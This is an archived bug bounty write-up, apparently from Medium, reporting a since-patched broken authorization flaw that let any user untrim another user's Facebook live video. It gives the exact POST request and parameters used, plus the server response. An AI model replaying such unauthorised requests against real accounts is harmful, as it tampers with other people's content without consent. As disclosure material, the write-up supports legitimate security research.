---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-04-18_poc-untrim-any-live-video-on-facebook.md
original_filename: 2021-04-18_poc-untrim-any-live-video-on-facebook.md
title: (POC) Untrim any live video on Facebook
category: documents
detected_topics:
- access-control
- command-injection
- otp
- graphql
- csrf
tags:
- imported
- documents
- access-control
- command-injection
- otp
- graphql
- csrf
language: en
raw_sha256: bf40c56ddea5371388473fd6d5aef46d229d8f362c186c35b4f6d78ea1628c2b
text_sha256: 77181ca23d0532c54e8dceaa88d901c73b1b59d2541fab32e56eec102c13981e
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# (POC) Untrim any live video on Facebook

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-04-18_poc-untrim-any-live-video-on-facebook.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, graphql, csrf
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `bf40c56ddea5371388473fd6d5aef46d229d8f362c186c35b4f6d78ea1628c2b`
- Text SHA256: `77181ca23d0532c54e8dceaa88d901c73b1b59d2541fab32e56eec102c13981e`


## Content

---
title: "(POC) Untrim any live video on Facebook"
url: "https://edmundaa222.medium.com/poc-untrim-any-live-video-on-facebook-ad6b97bad7c0"
authors: ["Ahmad Talahmeh"]
programs: ["Meta / Facebook"]
bugs: ["Broken authorization"]
bounty: "2,875"
publication_date: "2021-04-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3728
scraped_via: "browseros"
---

# (POC) Untrim any live video on Facebook

(POC) Untrim any live video on Facebook
Ahmad Talahmeh
Follow
Apr 19, 2021

12

Press enter or click to view image in full size
Description / Impact

It’s possible to untrim any live video on Facebook on behalf of the owners.

Impact

This could let a malicious user untrim any live video on Facebook using non GraphQL.

Proof Of Concept / Reprosteps

1. Obtain target live video ID
2. Submit the request with the value above (remember to update your CSRF token)

HTTP POST
/video_broadcast/trim/?new_start_seconds=0&new_end_seconds=99999999&reset_trimming=1&video_id=valueFromStep1&fb_dtsg=

Get Ahmad Talahmeh’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Host: facebook.com

Response

{
“__ar”: 1,
“payload”: {},
“hsrp”: {
“hblp”: {
“sr_revision”: 1002775749,
“consistency”: {
“rev”: 1002775749
}

The target live video has been untrimed on behalf of the owners.

Timeline:

06/10/2020 : Report sent

Triaged by Facebook after 6 hours

10/10/2020: $2875 bounty awarded during BountyCon 2020 (with bonus)

21/10/2020: Patch confirmed by Facebook
